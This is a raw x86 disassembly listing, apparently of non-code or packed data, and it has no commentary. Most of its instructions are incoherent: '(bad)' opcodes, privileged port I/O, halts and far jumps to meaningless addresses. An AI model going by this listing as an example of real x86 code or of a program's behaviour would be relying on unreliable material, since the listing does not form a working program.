  40bb9b:	shl    BYTE PTR [eax+0x64da4fcd],1
  40bba1:	add    DWORD PTR [eax-0x4b9b2751],edi
  40bba7:	push   esi
  40bba8:	retf   
  40bba9:	lock adc ebx,ebx
  40bbac:	fnsave [edi-0x78]
  40bbaf:	mov    eax,ds:0xf4bad4b6
  40bbb4:	add    eax,0xf4315e13
  40bbb9:	xchg   ebx,eax
  40bbba:	icebp  
  40bbbb:	push   eax
  40bbbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbbd:	mul    BYTE PTR [edi+0x6fe7c4c0]
  40bbc3:	stos   DWORD PTR es:[edi],eax
  40bbc4:	int3   
  40bbc5:	bound  edi,QWORD PTR [edx+0x0]
  40bbc8:	push   0xb865b9a9
  40bbcd:	xchg   edx,eax
  40bbce:	shr    ch,cl
  40bbd0:	pmuludq mm2,mm5
  40bbd3:	imul   edx,DWORD PTR [edi+eax*8-0x7a84e416],0x961107c1
  40bbde:	daa    
  40bbdf:	into   
  40bbe0:	jp     0x40bbf0
  40bbe2:	ins    DWORD PTR es:[edi],dx
  40bbe3:	jnp    0x40bc37
  40bbe5:	dec    ebp
  40bbe6:	jecxz  0x40bb94
  40bbe8:	stos   DWORD PTR es:[edi],eax
  40bbe9:	sar    DWORD PTR [esi+0x162945f3],cl
  40bbef:	mov    cl,0xa0
  40bbf1:	dec    edi
  40bbf2:	mov    eax,ds:0x720b89c
  40bbf7:	mov    edx,0x5bc45b6b
  40bbfc:	js     0x40bc0c
  40bbfe:	pushf  
  40bbff:	ret    0x4db2
  40bc02:	adc    eax,ebp
  40bc04:	jae    0x40bc25
  40bc06:	cmp    eax,0xe5d49799
  40bc0b:	neg    ebp
  40bc0d:	outs   dx,BYTE PTR ds:[esi]
  40bc0e:	xchg   ebp,eax
  40bc0f:	cmp    BYTE PTR [ecx-0x378c2126],bl
  40bc15:	fdivr  st(5),st
  40bc17:	xor    dh,BYTE PTR [eax]
  40bc19:	fwait
  40bc1a:	inc    eax
  40bc1b:	fs adc al,0x8b
  40bc1e:	jg     0x40bc97
  40bc20:	jge    0x40bc8c
  40bc22:	jb     0x40bc41
  40bc24:	dec    ebx
  40bc25:	mov    bl,0x58
  40bc27:	(bad)  
  40bc28:	loopne 0x40bc62
  40bc2a:	jno    0x40bc5c
  40bc2c:	(bad)  
  40bc2d:	lods   al,BYTE PTR ds:[esi]
  40bc2e:	sahf   
  40bc2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc30:	xchg   BYTE PTR ds:0x29d37260,dl
  40bc36:	or     eax,0xfabd2f39
  40bc3b:	shl    BYTE PTR [esi],0xa9
  40bc3e:	jl     0x40bca9
  40bc40:	les    esp,FWORD PTR [edx-0x58704e5e]
  40bc46:	sbb    BYTE PTR [eax],0x4b
  40bc49:	mov    bl,0x52
  40bc4b:	mov    BYTE PTR [edx+ebp*2-0x456340bc],bh
  40bc52:	je     0x40bc7f
  40bc54:	into   
  40bc55:	sbb    ebp,DWORD PTR [edi+eiz*4+0x56]
  40bc59:	mov    ds:0x680b0d02,eax
  40bc5e:	xchg   al,dl
  40bc60:	inc    ecx
  40bc61:	das    
  40bc62:	popf   
  40bc63:	push   cs
  40bc64:	and    BYTE PTR [esp+ebx*2],ch
  40bc67:	out    0x36,eax
  40bc69:	mov    edi,0x1d553bca
  40bc6e:	jbe    0x40bbf2
  40bc70:	fcomp  DWORD PTR ds:0x764f8639
  40bc76:	jg     0x40bc52
  40bc78:	ror    BYTE PTR [ebx-0x22],1
  40bc7b:	dec    esp
  40bc7c:	loopne 0x40bc94
  40bc7e:	sbb    al,0xeb
  40bc80:	ja     0x40bc74
  40bc82:	mov    edx,0xf8f06884
  40bc87:	test   BYTE PTR [esi+0x1c],0x66
  40bc8b:	je     0x40bcb1
  40bc8d:	xor    eax,0x6dd54a5f
  40bc92:	mov    ah,0xc8
  40bc94:	lock pushf 
  40bc96:	imul   ecx,DWORD PTR [eax-0x47],0xa8337e62
  40bc9d:	scas   al,BYTE PTR es:[edi]
  40bc9e:	add    BYTE PTR [ebx+0x416c34b5],ah
  40bca4:	xchg   esi,eax
  40bca5:	inc    edi
  40bca6:	mov    ecx,es
  40bca8:	outs   dx,DWORD PTR ds:[esi]
  40bca9:	fidivr WORD PTR [eax-0x2f57aad6]
  40bcaf:	sar    BYTE PTR [edx],1
  40bcb1:	(bad)  
  40bcb3:	repz (bad) 
  40bcb5:	add    ecx,edi
  40bcb7:	adc    esp,ebp
  40bcb9:	scas   eax,DWORD PTR es:[edi]
  40bcba:	lock pop ds
  40bcbc:	aam    0x22
  40bcbe:	mov    dh,0xff
  40bcc0:	fisubr WORD PTR [edi+0x4]
  40bcc3:	stos   BYTE PTR es:[edi],al
  40bcc4:	dec    esi
  40bcc5:	sti    
  40bcc6:	fisubr WORD PTR [edi]
  40bcc8:	cli    
  40bcc9:	push   edx
  40bcca:	xchg   edx,eax
  40bccb:	(bad)  
  40bccc:	xor    DWORD PTR [edi],esi
  40bcce:	jge    0x40bd44
  40bcd0:	sbb    al,0x2c
  40bcd2:	pop    es
  40bcd3:	popf   
  40bcd4:	mov    eax,ds:0x93ce3b70
  40bcd9:	test   BYTE PTR [edx+0x70],dh
  40bcdc:	mov    es,WORD PTR [edx+0x17873e46]
  40bce2:	aas    
  40bce3:	sbb    al,0xc
  40bce5:	xchg   DWORD PTR [ebx-0x59],edx
  40bce8:	sbb    eax,0x7fa6f933
  40bced:	cld    
  40bcee:	idiv   BYTE PTR [ecx]
  40bcf0:	int3   
  40bcf1:	repnz or eax,0xdfe1f04
  40bcf7:	fdivr  st(0),st
  40bcf9:	adc    DWORD PTR [ebx+0x5c306956],esi
  40bcff:	cmc    
  40bd00:	loope  0x40bccf
  40bd02:	lahf   
  40bd03:	mov    al,ds:0x8ac37d8a
  40bd08:	je     0x40bcac
  40bd0a:	jbe    0x40bd19
  40bd0c:	(bad)  
  40bd0d:	sbb    bl,BYTE PTR [ebp+0x6595acc]
  40bd13:	in     eax,dx
  40bd14:	div    ch
  40bd16:	ja     0x40bcae
  40bd18:	add    bl,BYTE PTR [eax+0x48a53041]
  40bd1e:	xor    cl,BYTE PTR [edx]
  40bd20:	loop   0x40bd4c
  40bd22:	lds    esp,FWORD PTR [esi]
  40bd24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd25:	push   eax
  40bd26:	(bad)  
  40bd27:	xor    al,0x13
  40bd29:	test   esi,eax
  40bd2b:	shl    edx,1
  40bd2d:	cmp    al,0xfd
  40bd2f:	aam    0x71
  40bd31:	popa   
  40bd32:	mov    al,0x8d
  40bd34:	inc    edx
  40bd35:	mov    ds:0xcea7a7e8,eax
  40bd3a:	jmp    0x40bd92
  40bd3c:	out    dx,eax
  40bd3d:	retf   
  40bd3e:	into   
  40bd3f:	jmp    0x3b948cfa
  40bd44:	push   cs
  40bd45:	in     eax,dx
  40bd46:	fs mov dl,cl
  40bd49:	scas   al,BYTE PTR es:[edi]
  40bd4a:	pop    edx
  40bd4b:	out    dx,eax
  40bd4c:	sbb    al,BYTE PTR [ecx-0x3a]
  40bd4f:	mov    cs,WORD PTR [ecx+0x7bda8f08]
  40bd55:	(bad)  
  40bd56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd57:	add    bl,BYTE PTR [edx-0x28ffaa01]
  40bd5d:	dec    esi
  40bd5e:	mov    dh,0xa6
  40bd60:	sub    BYTE PTR [ecx+0x3a10104b],0x63
  40bd67:	mov    ch,0xec
  40bd69:	push   ds
  40bd6a:	rol    DWORD PTR [ecx+ecx*1+0xb2f9e0],1
  40bd71:	dec    esp
  40bd72:	cmp    al,BYTE PTR [edx-0x7fdcc4ee]
  40bd78:	mov    WORD PTR [edi-0x6e],ss
  40bd7b:	xchg   edi,eax
  40bd7c:	push   esi
  40bd7d:	add    eax,0xca3abc32
  40bd82:	data16 adc al,0xd2
  40bd85:	push   edi
  40bd86:	xor    eax,0x23101cd3
  40bd8b:	fs pop edx
  40bd8d:	into   
  40bd8e:	aad    0xc9
  40bd90:	add    al,dl
  40bd92:	inc    BYTE PTR [ebx+0x34e4cea5]
  40bd98:	mov    WORD PTR [edi],cs
  40bd9a:	and    ecx,DWORD PTR [edx-0x648b38a0]
  40bda0:	int3   
  40bda1:	fwait
  40bda2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bda3:	and    eax,0xa2c4e7b9
  40bda8:	cmc    
  40bda9:	aaa    
  40bdaa:	iret   
  40bdab:	std    
  40bdac:	xor    BYTE PTR [eax+ebp*2+0x55],cl
  40bdb0:	repnz (bad) 
  40bdb2:	leave  
  40bdb3:	bound  edi,QWORD PTR [ecx+0x7c1fe525]
  40bdb9:	dec    ebx
  40bdba:	dec    edi
  40bdbb:	push   0x48
  40bdbd:	cmp    BYTE PTR [ebx-0x10],ah
  40bdc0:	test   DWORD PTR [esi],edx
  40bdc2:	add    ah,BYTE PTR ds:0xde54c681
  40bdc8:	push   ebx
  40bdc9:	loop   0x40be25
  40bdcb:	adc    eax,0x350d835a
  40bdd0:	fld    DWORD PTR [eax]
  40bdd2:	push   ebx
  40bdd3:	jno    0x40bdf1
  40bdd5:	jg     0x40bde6
  40bdd7:	lods   al,BYTE PTR ds:[esi]
  40bdd8:	outs   dx,BYTE PTR ds:[esi]
  40bdd9:	sub    al,0x8d
  40bddc:	data16 aas 
  40bdde:	nop
  40bddf:	pop    ebp
  40bde0:	and    al,0xd9
  40bde2:	xlat   BYTE PTR ds:[ebx]
  40bde3:	inc    eax
  40bde4:	imul   esi,DWORD PTR [esi],0xdc13d223
  40bdea:	retf   
  40bdeb:	or     DWORD PTR [edi],eax
  40bded:	mov    ch,0x37
  40bdef:	xcrypt-ecb (bad)
  40bdf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdf1:	retf   
  40bdf2:	mov    dl,0xf
  40bdf4:	cwde   
  40bdf5:	inc    ebx
  40bdf6:	ret    
  40bdf7:	stos   DWORD PTR es:[edi],eax
  40bdf8:	add    eax,esp
  40bdfa:	jne    0x40be77
  40bdfc:	add    dl,BYTE PTR [edi+edx*1]
  40bdff:	lods   al,BYTE PTR ds:[esi]
  40be00:	add    eax,0x3f4ed8cf
  40be05:	inc    ebx
  40be06:	aaa    
  40be07:	cmp    al,0x36
  40be09:	jo     0x40be3b
  40be0b:	dec    edi
  40be0c:	pop    ebx
  40be0d:	mov    dl,0x66
  40be0f:	dec    edx
  40be10:	adc    DWORD PTR [esi],0x3477b674
  40be16:	cmp    bh,BYTE PTR [edx-0x31]
  40be19:	xchg   ebp,eax
  40be1a:	push   edi
  40be1b:	mov    al,0xb8
  40be1d:	lds    edi,FWORD PTR [eax+0x40679d34]
  40be23:	test   DWORD PTR [edi-0x286374c],ebp
  40be29:	push   es
  40be2a:	mov    dl,0x58
  40be2c:	push   ebp
  40be2d:	jl     0x40bdea
  40be2f:	xor    BYTE PTR [edi-0x87ac1d5],0xab
  40be36:	jno    0x40bde6
  40be38:	jge    0x40bea4
  40be3a:	(bad)  
  40be3b:	jmp    0xc1582862
  40be40:	rep outs dx,DWORD PTR ds:[esi]
  40be42:	scas   eax,DWORD PTR es:[edi]
  40be43:	fimul  DWORD PTR [ecx-0x5247a898]
  40be49:	mov    ecx,DWORD PTR [ecx+0x103aa866]
  40be4f:	(bad)  
  40be50:	mov    bh,0x8
  40be52:	cmp    eax,0x6f0c6822
  40be57:	sbb    al,BYTE PTR ds:0x40fbc4ea
  40be5d:	mov    al,0xec
  40be5f:	mov    ecx,0x5cf81e48
  40be64:	inc    ebp
  40be65:	inc    edx
  40be66:	add    edx,esp
  40be68:	xor    ebx,DWORD PTR [ebp+0x59]
  40be6b:	mov    BYTE PTR [eax+ebx*1-0x9207a47],bl
  40be72:	ins    DWORD PTR es:[edi],dx
  40be73:	pop    edi
  40be74:	pushf  
  40be75:	sub    DWORD PTR [ecx+esi*4],edi
  40be78:	jg     0x40be4f
  40be7a:	dec    ecx
  40be7b:	scas   al,BYTE PTR es:[edi]
  40be7c:	push   esp
  40be7d:	mov    eax,ds:0x7ad3f379
  40be82:	aas    
  40be83:	mov    bl,0x3a
  40be85:	xlat   BYTE PTR ds:[ebx]
  40be86:	ja     0x40be62
  40be88:	int3   
  40be89:	or     al,0x33
  40be8b:	inc    ebp
  40be8c:	and    al,0x63
  40be8e:	pop    ds
  40be8f:	pop    ebp
  40be90:	std    
  40be91:	(bad)  
  40be92:	dec    esi
  40be93:	push   edi
  40be94:	mov    esi,0x136797c3
  40be99:	lock pop ebx
  40be9b:	stos   BYTE PTR es:[edi],al
  40be9c:	std    
  40be9d:	push   ecx
  40be9e:	push   ebp
  40be9f:	push   ebx
  40bea0:	repz cwde 
  40bea2:	loopne 0x40be73
  40bea4:	dec    edi
  40bea5:	or     BYTE PTR [edx+0x4a5dcc94],bh
  40beab:	scas   eax,DWORD PTR es:[edi]
  40beac:	or     al,0x91
  40beae:	pop    esi
  40beaf:	adc    eax,0x1bca02d1
  40beb4:	xor    DWORD PTR [eax-0x3ecfef88],edi
  40beba:	and    DWORD PTR [eax],esi
  40bebc:	clc    
  40bebd:	and    BYTE PTR [edi],al
  40bebf:	cmp    al,0x96
  40bec1:	push   0x36
  40bec3:	mov    bh,0xc6
  40bec5:	sbb    al,0x56
  40bec7:	fnstcw WORD PTR [edx+0x184a96a5]
  40becd:	mov    edx,0x8b969044
  40bed2:	pop    esi
  40bed3:	idiv   esi
  40bed5:	inc    esp
  40bed6:	fs inc edi
  40bed8:	loop   0x40bea6
  40beda:	hlt    
  40bedb:	xchg   edx,eax
  40bedc:	sar    edi,1
  40bede:	mov    ah,0x63
  40bee0:	sbb    dh,ch
  40bee2:	test   eax,0x6f671808
  40bee7:	arpl   sp,si
  40bee9:	nop
  40beea:	push   ss
  40beeb:	(bad)  
  40beec:	data16 sbb BYTE PTR [ebx+0x4a768a95],0x50
  40bef4:	mov    cl,cl
  40bef6:	add    al,0xc2
  40bef8:	mov    ebp,0xd852a016
  40befd:	test   al,0x1
  40beff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf00:	int    0x6d
  40bf02:	jmp    0x8dc8c6b2
  40bf07:	fisttp QWORD PTR ds:0xb3db8de
  40bf0d:	fdivr  DWORD PTR [ecx-0x6f]
  40bf10:	outs   dx,BYTE PTR ds:[esi]
  40bf11:	or     eax,0x6a7920b2
  40bf16:	les    ebx,FWORD PTR [edx-0x15]
  40bf19:	jecxz  0x40bee3
  40bf1b:	xchg   ecx,eax
  40bf1c:	adc    DWORD PTR [ebx-0x777ed042],0xffffffd7
  40bf23:	scas   al,BYTE PTR es:[edi]
  40bf24:	jns    0x40bf8b
  40bf26:	lds    eax,FWORD PTR [ecx]
  40bf28:	jno    0x40bf6d
  40bf2a:	push   ebx
  40bf2b:	mov    bl,0x30
  40bf2d:	outs   dx,BYTE PTR ds:[esi]
  40bf2e:	rol    DWORD PTR [eax+0x7c001ff0],0xe1
  40bf35:	xchg   edi,eax
  40bf36:	jle    0x40bf8a
  40bf38:	imul   edx,DWORD PTR [edi],0x99c98dc7
  40bf3e:	pop    esi
  40bf3f:	jmp    0xb1e8bcca
  40bf44:	and    DWORD PTR [ecx-0x67],ecx
  40bf47:	push   esp
  40bf48:	jns    0x40bfae
  40bf4a:	rol    DWORD PTR [ebx+eiz*1+0x37b0dc24],cl
  40bf51:	jns    0x40bee3
  40bf53:	jne    0x40bfbe
  40bf55:	push   ecx
  40bf56:	adc    dh,al
  40bf58:	sub    al,0xce
  40bf5a:	into   
  40bf5b:	xchg   esp,eax
  40bf5c:	adc    DWORD PTR ds:0x16fa44e1,0x47
  40bf63:	mov    bl,0x62
  40bf65:	xchg   BYTE PTR [esi+0x5c3fe318],al
  40bf6b:	sub    eax,0x949a9734
  40bf70:	mov    ds:0x4609bf31,eax
  40bf75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf77:	sbb    bh,BYTE PTR [eax]
  40bf79:	push   ebx
  40bf7a:	jmp    FWORD PTR [edx]
  40bf7c:	mov    WORD PTR [ebp+0x21],gs
  40bf7f:	fisubr DWORD PTR [ebx]
  40bf81:	shl    BYTE PTR [eax+0x19],1
  40bf84:	mov    bl,0x4d
  40bf86:	sidtd  [ebp-0xd704275]
  40bf8d:	daa    
  40bf8e:	xchg   esi,eax
  40bf8f:	popf   
  40bf90:	pusha  
  40bf91:	or     DWORD PTR [edx+0x6e],ebp
  40bf94:	mov    WORD PTR [esi+0x4c7219e1],ds
  40bf9a:	in     eax,dx
  40bf9b:	ror    DWORD PTR [edi],0xe5
  40bf9e:	mov    edi,DWORD PTR [ebp-0x17f68cc1]
  40bfa4:	pop    edi
  40bfa5:	setno  BYTE PTR [edi+0x39b9a4eb]
  40bfac:	pop    ebx
  40bfad:	jae    0x40c001
  40bfaf:	jge    0x40bf6c
  40bfb1:	jmp    0x40c000
  40bfb3:	hlt    
  40bfb4:	cmc    
  40bfb5:	mov    ah,0x38
  40bfb7:	or     bh,BYTE PTR [eax]
  40bfb9:	pop    edx
  40bfba:	jae    0x40bf61
  40bfbc:	and    bh,bl
  40bfbe:	sbb    DWORD PTR [ebp-0x1f],eax
  40bfc1:	mov    bl,0x9f
  40bfc3:	scas   eax,DWORD PTR es:[edi]
  40bfc4:	push   ebp
  40bfc5:	cmovae esi,DWORD PTR ds:0x98fa611c
  40bfcc:	out    dx,al
  40bfcd:	inc    ecx
  40bfce:	xor    BYTE PTR [ecx+ecx*1-0x30808772],bh
  40bfd5:	test   al,0x38
  40bfd7:	popf   
  40bfd8:	ins    BYTE PTR es:[edi],dx
  40bfd9:	add    DWORD PTR [ebx-0x5b],0xd5babcc4
  40bfe0:	and    DWORD PTR [eax+0x68],ebp
  40bfe3:	mov    bl,0xb
  40bfe5:	adc    DWORD PTR [edi+0x6dd38f9e],edi
  40bfeb:	imul   eax,esi,0xaaef3c75
  40bff1:	add    eax,0x60e43cf7
  40bff6:	xchg   BYTE PTR [edi-0x3f5b7cce],dl
  40bffc:	mov    ds:0xae458e86,eax
  40c001:	xor    al,0x3b
  40c003:	add    eax,0x3dbed12d
  40c008:	push   esp
  40c009:	or     ebp,ebx
  40c00b:	imul   edx,DWORD PTR [eax+eax*2-0x443c8b30],0x46cb8d3e
  40c016:	jo     0x40c00f
  40c018:	mov    ecx,0x3c06086d
  40c01d:	inc    edx
  40c01e:	gs pop ebx
  40c020:	mov    ch,0x25
  40c023:	ror    DWORD PTR [ebp-0x625c176b],cl
  40c029:	jl     0x40c062
  40c02b:	dec    edi
  40c02c:	add    eax,0xfc76f950
  40c031:	add    eax,0x866caccf
  40c036:	push   ecx
  40c037:	and    edx,esi
  40c039:	into   
  40c03a:	iret   
  40c03b:	(bad)  
  40c03c:	jmp    0x40c01f
  40c03e:	sti    
  40c03f:	sbb    al,0x44
  40c041:	sahf   
  40c042:	fadd   DWORD PTR [eax+0x133c2ec1]
  40c048:	mov    dh,0xb6
  40c04a:	mov    edi,0xac5152ce
  40c04f:	aaa    
  40c050:	or     BYTE PTR [ebx-0xcd86082],cl
  40c056:	rcr    BYTE PTR [eax],cl
  40c058:	in     al,0x26
  40c05a:	fdiv   QWORD PTR ds:0x66baf803
  40c060:	jl     0x40c07b
  40c062:	or     al,bl
  40c064:	xchg   ebx,eax
  40c065:	lea    eax,[ebx+edx*8-0x38662b5a]
  40c06c:	mov    ch,0x60
  40c06e:	test   BYTE PTR [eax-0x4b],ah
  40c071:	xchg   ebx,eax
  40c072:	ins    DWORD PTR es:[edi],dx
  40c073:	sar    BYTE PTR [edi+0x4],cl
  40c076:	icebp  
  40c077:	pop    ebx
  40c078:	push   esi
  40c079:	mov    al,0x51
  40c07b:	sbb    edx,DWORD PTR [ebx+ebp*2-0x3e3667ae]
  40c082:	and    eax,0x3e3899e1
  40c087:	shr    dh,0x53
  40c08a:	mov    ds:0xc0af26b3,al
  40c08f:	and    DWORD PTR [ebp+0xc],0x1c86a82b
  40c096:	xchg   ecx,eax
  40c097:	cmc    
  40c098:	push   eax
  40c099:	test   DWORD PTR [esp+eiz*2+0x35],edx
  40c09d:	jnp    0x40c025
  40c09f:	(bad)  
  40c0a0:	ins    BYTE PTR es:[edi],dx
  40c0a1:	hlt    
  40c0a2:	cmp    DWORD PTR [ecx+0x7a511562],edx
  40c0a8:	in     al,0xed
  40c0aa:	pusha  
  40c0ab:	push   ss
  40c0ac:	int    0x15
  40c0ae:	push   es
  40c0af:	and    BYTE PTR [edx],ch
  40c0b1:	mov    bl,0x21
  40c0b3:	aaa    
  40c0b4:	fldcw  WORD PTR [edx]
  40c0b6:	std    
  40c0b7:	jmp    0x2214:0xf5683a3f
  40c0be:	hlt    
  40c0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0c0:	jnp    0x40c137
  40c0c2:	jl     0x40c10f
  40c0c4:	add    cl,al
  40c0c6:	or     eax,0xc3a3d804
  40c0cb:	bound  ebp,QWORD PTR [eax]
  40c0cd:	pop    ebp
  40c0ce:	jo     0x40c0a6
  40c0d0:	pop    edx
  40c0d1:	adc    al,0xdd
  40c0d3:	sbb    esp,ecx
  40c0d5:	sub    eax,0xc7121cf
  40c0da:	imul   eax,DWORD PTR [edx-0x35],0xc1faf479
  40c0e1:	sbb    eax,0x2f058b5f
  40c0e6:	in     al,dx
  40c0e7:	shr    BYTE PTR [eax+0x5a90fc3a],1
  40c0ed:	mov    esp,0xc12c8a09
  40c0f2:	mov    ds:0xff86c45d,al
  40c0f7:	lods   al,BYTE PTR ds:[esi]
  40c0f8:	pop    ds
  40c0f9:	mov    ecx,0xb66b08ad
  40c0fe:	push   cs
  40c0ff:	dec    esp
  40c100:	iret   
  40c101:	cs sub eax,0x8597df1f
  40c107:	cmc    
  40c108:	(bad)  
  40c109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c10a:	jmp    0x4d52:0x431dc958
  40c111:	xchg   esi,eax
  40c112:	sar    DWORD PTR [ecx-0x12],1
  40c115:	cs pushf 
  40c117:	jne    0x40c0cc
  40c119:	push   edx
  40c11a:	rcl    DWORD PTR [ebx-0x4fc2a2b6],0x9b
  40c121:	out    dx,al
  40c122:	jmp    0x637:0x4a4746e5
  40c129:	jmp    0x40c107
  40c12b:	into   
  40c12c:	hlt    
  40c12d:	jmp    ebp
  40c12f:	shl    DWORD PTR [esi-0x1f],0x10
  40c133:	dec    ebp
  40c134:	and    al,0x2b
  40c136:	jle    0x40c1a3
  40c138:	mov    eax,db1
  40c13b:	lods   eax,DWORD PTR ds:[esi]
  40c13c:	mov    esp,0x80abcefd
  40c141:	or     dl,BYTE PTR [ebx+edx*2-0x59dd5539]
  40c148:	gs jo  0x40c0dd
  40c14b:	pop    eax
  40c14c:	mov    ss,WORD PTR [edi-0x5f69ff81]
  40c152:	adc    al,0x26
  40c154:	pop    ebx
  40c155:	adc    BYTE PTR [ebx+0x40],dh
  40c158:	fbstp  TBYTE PTR [ebx]
  40c15a:	lods   eax,DWORD PTR ds:[esi]
  40c15b:	mov    dl,BYTE PTR [ebx+0x469a585a]
  40c161:	(bad)  
  40c163:	mov    edx,cs
  40c165:	adc    bh,bl
  40c167:	jecxz  0x40c138
  40c169:	in     al,dx
  40c16a:	adc    cl,bl
  40c16c:	icebp  
  40c16d:	ins    DWORD PTR es:[edi],dx
  40c16e:	sub    al,0x74
  40c170:	ss inc edx
  40c172:	dec    DWORD PTR es:[edi+0x68c2e947]
  40c179:	mov    ah,0xf5
  40c17b:	inc    esi
  40c17c:	pop    edi
  40c17d:	loope  0x40c146
  40c17f:	(bad)  
  40c180:	fisub  WORD PTR [edx+0x11]
  40c183:	(bad)  
  40c184:	ror    dl,1
  40c186:	scas   eax,DWORD PTR es:[edi]
  40c187:	(bad)  
  40c189:	scas   al,BYTE PTR es:[edi]
  40c18a:	push   edx
  40c18b:	cld    
  40c18c:	shl    DWORD PTR [eax],0x51
  40c18f:	inc    edi
  40c190:	jg     0x40c156
  40c192:	sub    eax,0x2dc7e22f
  40c197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c198:	mov    ah,0xc4
  40c19a:	xor    DWORD PTR [edx+0x8],ecx
  40c19d:	cmp    dh,bl
  40c19f:	(bad)  [esi+0x48a2ff3d]
  40c1a5:	and    DWORD PTR [edx+0x7f],ebx
  40c1a8:	scas   eax,DWORD PTR es:[edi]
  40c1a9:	in     eax,dx
  40c1aa:	ins    DWORD PTR es:[edi],dx
  40c1ab:	xor    BYTE PTR [edi+0x1c60bd47],al
  40c1b1:	xchg   esi,eax
  40c1b2:	das    
  40c1b3:	mov    esp,0xe1ab5291
  40c1b8:	mov    edi,0x511c56a7
  40c1bd:	test   BYTE PTR [ebx],bh
  40c1bf:	dec    esp
  40c1c0:	data16 mov WORD PTR [eax-0x1d],es
  40c1c4:	mov    ebx,0xb834d746
  40c1c9:	(bad)  
  40c1ca:	es adc eax,0xaea84dba
  40c1d0:	sub    DWORD PTR [edx-0x7f],esi
  40c1d3:	leave  
  40c1d4:	dec    eax
  40c1d5:	sar    DWORD PTR [eax+edi*2+0x202018ea],cl
  40c1dc:	or     al,0xca
  40c1de:	arpl   WORD PTR [esi-0x31],bp
  40c1e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1e2:	xchg   edi,eax
  40c1e3:	pusha  
  40c1e4:	stc    
  40c1e5:	sub    eax,0x18e11970
  40c1ea:	lods   al,BYTE PTR ds:[esi]
  40c1eb:	mov    ebx,0x8cba3d66
  40c1f0:	pop    ecx
  40c1f1:	pop    ecx
  40c1f2:	mov    bl,0x3b
  40c1f4:	and    al,0x3b
  40c1f6:	pop    ss
  40c1f7:	ret    
  40c1f8:	mov    ecx,?
  40c1fa:	push   ebx
  40c1fb:	push   0xfffffff6
  40c1fd:	jmp    0xc262ab30
  40c202:	and    DWORD PTR [eax],0x39
  40c205:	mov    dh,BYTE PTR [eax+0xc]
  40c208:	hlt    
  40c209:	cli    
  40c20a:	dec    esp
  40c20b:	ja     0x40c277
  40c20d:	stc    
  40c20e:	(bad)  
  40c20f:	cmp    dl,bh
  40c211:	call   0xa56b:0xdb9ea507
  40c218:	jg     0x40c235
  40c21a:	mov    eax,ds:0xbbf82bf6
  40c21f:	or     eax,0x8fb8ef3b
  40c224:	push   esp
  40c225:	mul    BYTE PTR [edx-0x42ef92e1]
  40c22b:	pop    esp
  40c22c:	cli    
  40c22d:	pop    eax
  40c22e:	fisubr WORD PTR [eax-0x4046573b]
  40c234:	stc    
  40c235:	int3   
  40c236:	fs in  eax,dx
  40c238:	push   esi
  40c239:	xchg   edi,eax
  40c23a:	fadd   QWORD PTR [eax]
  40c23c:	xchg   cl,al
  40c23e:	and    al,0x43
  40c240:	in     al,0x9a
  40c242:	sub    bh,BYTE PTR [ebx-0x8]
  40c245:	icebp  
  40c246:	(bad)  
  40c247:	sub    edi,DWORD PTR [edi+0x6d0758d4]
  40c24d:	dec    edi
  40c24e:	xchg   ebx,eax
  40c24f:	fwait
  40c250:	cwde   
  40c251:	fst    DWORD PTR [edx]
  40c253:	iret   
  40c254:	pop    esp
  40c255:	dec    esi
  40c256:	xor    BYTE PTR [edx],ch
  40c258:	pop    eax
  40c259:	popa   
  40c25a:	cmp    cl,bl
  40c25c:	adc    DWORD PTR [esi-0x69],edx
  40c25f:	or     eax,0x2cc074ea
  40c264:	add    ecx,esi
  40c266:	sbb    eax,0x46084655
  40c26b:	push   ss
  40c26c:	sbb    DWORD PTR [ebx],edx
  40c26e:	imul   edx,DWORD PTR [ebx],0xffffffc3
  40c271:	cwde   
  40c272:	mov    ds:0x169a1d16,eax
  40c277:	daa    
  40c278:	retf   
  40c279:	out    0x44,eax
  40c27b:	mov    dh,0xf9
  40c27d:	or     dh,BYTE PTR [ebx+edx*2-0x130a7484]
  40c284:	pop    ds
  40c285:	dec    esi
  40c286:	shl    BYTE PTR ds:0xc7d0115,1
  40c28c:	inc    edi
  40c28d:	mov    ch,0xcc
  40c28f:	pop    ecx
  40c290:	sub    eax,0xa4ad981c
  40c295:	sbb    dh,ch
  40c297:	jmp    DWORD PTR [ebp+0x6d]
  40c29a:	mov    bl,0x5b
  40c29c:	lods   al,BYTE PTR ds:[esi]
  40c29d:	pop    ds
  40c29e:	ret    
  40c29f:	scas   al,BYTE PTR es:[edi]
  40c2a0:	call   0x2e3418b1
  40c2a5:	sti    
  40c2a6:	sub    ch,BYTE PTR [ebx-0x537e8779]
  40c2ac:	ins    BYTE PTR es:[edi],dx
  40c2ad:	jmp    0x40c2bb
  40c2af:	js     0x40c327
  40c2b1:	mov    dl,0xfb
  40c2b3:	jae    0x40c27d
  40c2b5:	jnp    0x40c335
  40c2b7:	mov    ecx,esi
  40c2b9:	fcomp  st(1)
  40c2bb:	dec    edi
  40c2bc:	sub    eax,0xa9055203
  40c2c1:	sbb    DWORD PTR [ecx-0x48],ecx
  40c2c4:	addr16 lahf 
  40c2c6:	adc    BYTE PTR [esi+0x2d],cl
  40c2c9:	cmc    
  40c2ca:	adc    ebp,DWORD PTR [esi-0x6591745f]
  40c2d0:	mov    esi,?
  40c2d2:	pop    ebp
  40c2d3:	scas   eax,DWORD PTR es:[edi]
  40c2d4:	mov    dh,BYTE PTR [esi+ecx*8+0x1dfd84d]
  40c2db:	push   esi
  40c2dc:	fbstp  TBYTE PTR [ebp+0x4b]
  40c2df:	iret   
  40c2e0:	add    al,0x9a
  40c2e2:	adc    al,0xda
  40c2e4:	test   BYTE PTR [esi+0x2c],al
  40c2e7:	sub    al,0x9d
  40c2e9:	(bad)  
  40c2ea:	fwait
